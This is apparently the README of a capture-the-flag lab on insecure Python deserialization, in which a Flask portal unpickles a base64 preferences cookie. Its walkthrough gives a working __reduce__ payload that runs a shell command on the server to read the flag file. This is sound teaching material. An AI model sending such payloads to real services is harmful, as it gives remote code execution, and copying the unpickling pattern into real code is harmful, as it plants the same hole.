# Pickle preferences

Insecure deserialization: user preferences stored as a base64 pickled object
in a cookie.

## Vulnerability description

The portal keeps visitor preferences (theme, layout) in a `prefs` cookie. The
cookie is a base64-encoded Python pickle, and the server restores it with:

```python
prefs = pickle.loads(base64.b64decode(cookie))
```

`pickle.loads` on attacker-controlled bytes executes whatever the serialized
stream says to execute during reconstruction. A crafted object whose
`__reduce__` returns `(eval, ("...",))` runs Python as the web process before
any preference is ever read. A signed cookie, or JSON instead of pickle,
would close the bug.

## Vulnerable configuration

The flag is mounted at `/flag/flag.txt` and the Flask process can read it.
The unpickled object is rendered into the page as the theme name, so a
payload that evaluates to `{"theme": <flag file contents>}` puts the flag
straight into the response.

## Running the lab

```bash
docker compose up
```

The app listens on http://localhost:8080.

## Exploitation walkthrough

Decode the cookie the server sets on first visit and confirm it is a pickle
(opcode bytes, base64-wrapped). Then build a malicious preferences object:

```python
class Evil:
    def __reduce__(self):
        return (eval, ("{'theme': __import__('os').popen('cat /flag/flag.txt').read()}",))
```

Send `base64(pickle.dumps(Evil()))` as the `prefs` cookie and the rendered
page shows the flag as your theme. `solutions/pickle-preferences/solve.py`
in a checkout of this repo automates it.

## References

- OWASP: deserialization of untrusted data (CWE-502)
- Python docs: pickle, "it is possible to construct malicious pickle data
  which will execute arbitrary code during unpickling"
